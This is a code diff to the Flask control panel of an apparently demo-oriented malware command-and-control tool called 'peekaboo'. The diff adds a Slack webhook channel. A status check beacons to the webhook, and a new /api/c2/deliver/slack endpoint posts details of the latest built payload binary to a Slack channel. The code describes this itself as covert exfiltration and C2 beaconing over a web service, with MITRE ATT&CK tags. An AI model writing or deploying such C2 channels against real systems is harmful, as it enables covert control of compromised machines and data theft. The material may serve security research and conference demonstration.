@@ -309,7 +309,7 @@ def api_logs_clear():
 _SAFE_CONFIGS = {
     "telegram_config", "github_config", "bitbucket_config", "virustotal_config",
     "anthropic_config", "gemini_config", "malpedia_config",
-    "azure_config", "angelcam_config", "ollama_config",
+    "azure_config", "angelcam_config", "ollama_config", "slack_config",
 }
 _SECRET_KEYS = {
     "bot_token", "github_token", "api_key", "api_token",
@@ -431,6 +431,25 @@ def api_c2_status():
             results["virustotal"] = {"ok": False, "error": str(e)}
     else:
         results["virustotal"] = {"ok": False, "error": "not configured"}
+
+    # Slack
+    cfg = _load_config("slack_config")
+    webhook = cfg.get("webhook_url", "") if cfg else ""
+    if webhook and "YOUR/WEBHOOK" not in webhook:
+        try:
+            r = _requests.post(
+                webhook,
+                json={"text": "[peekaboo] status check - [=^..^=]"},
+                timeout=5,
+            )
+            results["slack"] = {
+                "ok":   r.status_code == 200,
+                "name": "webhook ok" if r.status_code == 200 else r.text[:60],
+            }
+        except Exception as e:
+            results["slack"] = {"ok": False, "error": str(e)}
+    else:
+        results["slack"] = {"ok": False, "error": "not configured"}
 
     return jsonify(results)
 
@@ -682,6 +701,52 @@ def c2_deliver_bitbucket():
                 "path":     filename,
                 "url":      file_url,
                 "technique": "T1102 + T1105",
+            })
+        else:
+            return jsonify({"ok": False, "error": resp.text[:300]}), 400
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
+@app.route("/api/c2/deliver/slack", methods=["POST"])
+def c2_deliver_slack():
+    """
+    Send a notification + binary info to a Slack channel via incoming webhook.
+    Demonstrates: covert exfiltration / C2 beacon over Slack API.
+    MITRE ATT&CK: T1102 (Web Service), T1071.001 (Application Layer Protocol)
+    """
+    if not HAS_REQUESTS:
+        return jsonify({"ok": False, "error": "requests not installed"}), 500
+
+    cfg = _load_config("slack_config")
+    if not cfg:
+        return jsonify({"ok": False, "error": "slack_config.json not found"}), 400
+
+    webhook = cfg.get("webhook_url", "")
+    if not webhook or "YOUR/WEBHOOK" in webhook:
+        return jsonify({"ok": False, "error": "slack webhook not configured"}), 400
+
+    binary = _find_latest_binary()
+    if not binary:
+        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+
+    body = request.get_json(silent=True) or {}
+    text = body.get("text",
+        f"*[peekaboo]* payload ready\n"
+        f">*file:* `{binary.name}`\n"
+        f">*size:* `{binary.stat().st_size:,}` bytes\n"
+        f">*time:* `{datetime.utcnow().isoformat()}Z`\n"
+        f">_DEFCON Demo Labs Singapore 2026 - by @cocomelonc_")
+
+    try:
+        resp = _requests.post(webhook, json={"text": text}, timeout=10)
+        if resp.status_code == 200:
+            return jsonify({
+                "ok":        True,
+                "channel":   "slack",
+                "file":      binary.name,
+                "size":      binary.stat().st_size,
+                "technique": "T1102 + T1071.001",
             })
         else:
             return jsonify({"ok": False, "error": resp.text[:300]}), 400
